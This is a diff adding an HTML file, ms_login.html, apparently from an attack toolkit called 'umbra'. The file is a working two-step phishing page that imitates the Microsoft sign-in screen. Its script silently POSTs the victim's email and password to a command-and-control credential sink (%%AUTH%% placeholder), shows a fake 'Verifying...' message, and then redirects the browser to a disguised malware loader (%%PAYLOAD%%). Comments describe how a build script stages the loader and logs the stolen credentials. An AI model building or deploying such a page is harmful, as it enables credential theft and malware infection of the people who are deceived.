@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<!-- ms_login.html - fallback landing page (SMUGGLE=0).
+     Two-step Microsoft sign-in lure. On "Sign in" it silently POSTs the
+     typed credentials to %%AUTH%% (the C2 credential sink, appended to
+     <certdir>/creds.jsonl) and then sends the browser to %%PAYLOAD%%
+     (the disguised loader copy staged by scripts/build.sh).
+     The self-contained smuggle page is the default; build.sh replaces this
+     file's tokens when SMUGGLE=0. -->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sign in | Microsoft</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect width='10' height='10' fill='%23f25022'/%3E%3Crect x='11' width='10' height='10' fill='%237fba00'/%3E%3Crect y='11' width='10' height='10' fill='%2300a4ef'/%3E%3Crect x='11' y='11' width='10' height='10' fill='%23ffb900'/%3E%3C/svg%3E">
+<style>
+  * { box-sizing: border-box; }
+  html, body { height: 100%; }
+  body { margin:0; min-height:100vh; font-family:"Segoe UI", system-ui, -apple-system, Arial, sans-serif;
+    background:#fff; color:#1b1b1b; }
+  .wrap { min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px 16px; }
+  .card { width:100%; max-width:440px; }
+  .logo { display:flex; align-items:center; gap:9px; margin-bottom:22px; }
+  .sq { display:grid; grid-template-columns:11px 11px; grid-gap:2px; }
+  .sq i { width:11px; height:11px; display:block; }
+  .sq i:nth-child(1){ background:#f25022; } .sq i:nth-child(2){ background:#7fba00; }
+  .sq i:nth-child(3){ background:#00a4ef; } .sq i:nth-child(4){ background:#ffb900; }
+  .brand { font-size:17px; color:#5e5e5e; font-weight:400; }
+  h1 { font-size:24px; font-weight:600; margin:0 0 12px; color:#1b1b1b; }
+  .who { font-size:14px; color:#1b1b1b; margin:0 0 16px; }
+  .who a { color:#0067b8; text-decoration:none; font-size:13px; }
+  .field { position:relative; margin-bottom:16px; }
+  .field input { width:100%; border:0; border-bottom:1px solid #666; padding:10px 0 6px;
+    font-size:15px; outline:none; background:transparent; color:#1b1b1b; border-radius:0; }
+  .field input:focus { border-bottom:2px solid #0067b8; }
+  .field label { position:absolute; left:0; top:10px; font-size:15px; color:#666; pointer-events:none; transition:all .12s; }
+  .field input:focus + label, .field input:not(:placeholder-shown) + label
+    { top:-9px; font-size:12px; color:#0067b8; }
+  .hint { font-size:13px; color:#1b1b1b; margin:0 0 20px; }
+  .hint a { color:#0067b8; text-decoration:none; }
+  .btnrow { display:flex; justify-content:flex-end; gap:8px; margin-top:18px; }
+  button.act { border:0; background:#0067b8; color:#fff; font-size:15px; padding:10px 44px;
+    border-radius:2px; cursor:pointer; font-family:inherit; }
+  button.act:hover { background:#005da6; }
+  button.act:disabled { background:#9bc2e6; cursor:default; }
+  button.sec { border:1px solid #8a8886; background:#fff; color:#1b1b1b; font-size:15px;
+    padding:9px 20px; border-radius:2px; cursor:pointer; font-family:inherit; }
+  .links { margin-top:28px; font-size:13px; }
+  .links a { color:#0067b8; text-decoration:none; display:block; margin-bottom:12px; }
+  .status { font-size:13px; color:#666; margin-top:14px; min-height:18px; }
+  .err { color:#e81123; font-size:13px; margin:4px 0 8px; display:none; }
+  .foot { position:fixed; left:0; right:0; bottom:0; display:flex; justify-content:flex-end; gap:20px;
+    padding:10px 24px; font-size:12px; color:#666; background:rgba(255,255,255,.9); }
+  .foot a { color:#666; text-decoration:none; }
+  .spin { display:inline-block; width:14px; height:14px; border:2px solid rgba(255,255,255,.45);
+    border-top-color:#fff; border-radius:50%; vertical-align:-2px; margin-right:8px;
+    animation:sp .8s linear infinite; }
+  @keyframes sp { to { transform:rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <main class="card">
+    <div class="logo">
+      <span class="sq"><i></i><i></i><i></i><i></i></span>
+      <span class="brand">Microsoft</span>
+    </div>
+
+    <section id="step1">
+      <h1>Sign in</h1>
+      <p class="hint">Use your Microsoft account.</p>
+      <div class="err" id="err1">Enter a valid email, phone, or Skype.</div>
+      <form id="f1" autocomplete="off">
+        <div class="field">
+          <input type="email" id="user" placeholder=" " autocapitalize="none" autocomplete="username">
+          <label for="user">Email, phone, or Skype</label>
+        </div>
+        <div class="links"><a href="#" onclick="return false">Forgot your email?</a></div>
+        <div class="btnrow"><button class="act" type="submit">Next</button></div>
+      </form>
+    </section>
+
+    <section id="step2" hidden>
+      <h1>Enter password</h1>
+      <p class="who"><span id="who"></span><br><a href="#" id="back">Forgot your email?</a></p>
+      <div class="err" id="err2">Enter the password for your account.</div>
+      <form id="f2" autocomplete="off">
+        <div class="field">
+          <input type="password" id="pass" placeholder=" " autocomplete="current-password">
+          <label for="pass">Enter password</label>
+        </div>
+        <div class="links"><a href="#" onclick="return false">Forgot your password?</a></div>
+        <div class="btnrow">
+          <button class="sec" type="button" id="backBtn">Back</button>
+          <button class="act" type="submit" id="signin">Sign in</button>
+        </div>
+      </form>
+    </section>
+
+    <div class="status" id="status"></div>
+  </main>
+</div>
+<footer class="foot">
+  <a href="#" onclick="return false">Terms of use</a>
+  <a href="#" onclick="return false">Privacy &amp; cookies</a>
+  <span>...</span>
+</footer>
+
+<script>
+/* Fallback delivery (umbra). Credentials -> %%AUTH%%; payload -> %%PAYLOAD%%. */
+var AUTH    = "%%AUTH%%";
+var PAYLOAD = "%%PAYLOAD%%";
+
+function esc(s) { try { return encodeURIComponent(s); } catch (e) { return s; } }
+
+function sendCreds(u, p) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open("POST", AUTH, true);
+    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    x.send("email=" + esc(u) + "&password=" + esc(p) + "&client=web&locale=en-US");
+  } catch (e) {}
+}
+
+var userEl = document.getElementById("user");
+var passEl = document.getElementById("pass");
+var signin = document.getElementById("signin");
+var busy = false;
+
+function go2() {
+  var u = userEl.value.replace(/^\s+|\s+$/g, "");
+  if (!u || u.indexOf("@") < 0) {
+    document.getElementById("err1").style.display = "block";
+    userEl.focus();
+    return;
+  }
+  document.getElementById("err1").style.display = "none";
+  document.getElementById("who").textContent = u;
+  document.getElementById("step1").hidden = true;
+  document.getElementById("step2").hidden = false;
+  passEl.focus();
+}
+function back() {
+  document.getElementById("step2").hidden = true;
+  document.getElementById("step1").hidden = false;
+  userEl.focus();
+}
+function signinNow() {
+  if (busy) return;
+  var u = document.getElementById("who").textContent || userEl.value;
+  var p = passEl.value;
+  if (!p) {
+    document.getElementById("err2").style.display = "block";
+    passEl.focus();
+    return;
+  }
+  document.getElementById("err2").style.display = "none";
+  busy = true;
+  signin.disabled = true;
+  signin.innerHTML = '<span class="spin"></span>Verifying...';
+  sendCreds(u, p);
+  document.getElementById("status").textContent = "Connecting to your work environment...";
+  setTimeout(function () { window.location = PAYLOAD; }, 1400);
+}
+
+document.getElementById("f1").addEventListener("submit", function (e) { e.preventDefault(); go2(); });
+document.getElementById("f2").addEventListener("submit", function (e) { e.preventDefault(); signinNow(); });
+document.getElementById("back").addEventListener("click", function (e) { e.preventDefault(); back(); });
+document.getElementById("backBtn").addEventListener("click", back);
+</script>
+</body>
+</html>
